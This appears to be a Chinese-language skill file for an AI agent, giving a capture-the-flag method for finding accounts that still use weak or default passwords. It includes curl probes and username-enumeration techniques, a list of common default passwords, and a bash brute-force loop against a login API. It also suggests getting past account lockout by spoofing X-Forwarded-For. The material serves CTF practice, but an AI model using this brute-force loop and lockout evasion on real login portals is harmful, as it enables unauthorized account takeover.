---
name: credential-enum-default-password
description: 弱口令/默认密码/初始密码枚举通法。Use when the challenge mentions "初始密码/默认口令/未改密码/找出账号/身份门户/登录" — targets where the vulnerability is weak or default credentials that users haven't changed.
---

# 弱口令/默认密码枚举通法

## 题型特征

题面出现: "初始密码"、"默认口令"、"找出未改口令的账号"、"身份门户"

## 解题四步

### 1. 找到登录入口和用户名格式

```bash
# 探测登录接口
curl -s http://target/ | grep -i "login\|sign.in\|username\|password"
curl -s http://target/login
curl -s http://target/api/auth/login
```

### 2. 枚举有效用户名

| 来源 | 方法 |
|---|---|
| 页面信息 | 关于页面/团队介绍/联系方式 |
| 注册接口 | 尝试注册已存在的用户名看报错 |
| 忘记密码 | 输入用户名看"已发送重置邮件"vs"用户不存在" |
| API 接口 | `/api/users` / `/api/employees` / 目录枚举 |
| 编号规律 | 工号(1001/2001/admin)、邮箱(zhangsan@company.com)、手机号 |
| 响应差异 | 错误用户名 vs 错误密码 的响应不同(时间/内容/状态码) |

### 3. 初始密码猜测(高频表)

| 类型 | 常见初始密码 |
|---|---|
| 系统默认 | `123456`, `password`, `admin`, `admin123`, `000000` |
| 工号相关 | 与用户名相同、`username+123`、`username+@2024` |
| 公司名 | `Company@123`, `company2024`, `Baidu@123` |
| 手机号 | 手机号后 6 位 |
| 规则模板 | `姓名拼音首字母+工号`、`Abc@123456` |
| 平台标准 | `P@ssw0rd`, `Welcome1`, `Changeme123` |

### 4. 爆破脚本(上下文密码优先)

```bash
# 先试少量高频密码(不触发锁定)
for user in admin user01 zhangsan 1001 2001; do
  for pass in 123456 admin admin123 "${user}123" "P@ssw0rd" "Abc@123456"; do
    code=$(curl -so /dev/null -w "%{http_code}" -X POST http://target/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"$user\",\"password\":\"$pass\"}")
    if [ "$code" != "401" ] && [ "$code" != "403" ]; then
      echo "HIT: $user / $pass → $code"
    fi
  done
done
```

## 高级技巧

- **响应时间差异**: 正确用户名+错误密码 可能比 错误用户名 慢几毫秒(数据库查询)
- **账户锁定绕过**: 换 IP(X-Forwarded-For)、换 User-Agent、等待解锁
- **批量注册检测**: `POST /api/register {"username":"admin"}` → "already exists" = 有效用户名
- **API 批量查**: 如果有 `/api/users?page=1` 或类似列表接口,直接拿用户名列表

## 铁律

- **先找用户名列表,再试密码** — 不要对着一个用户名暴力跑大字典
- **初始密码通常有规律** — 题面"初始密码"意味着有固定模板(如工号+固定后缀)
- **少量高频密码 > 大字典** — CTF 里初始密码通常在 top-20 常见密码内
- 如果有"注册"功能,先注册一个看默认密码格式是什么
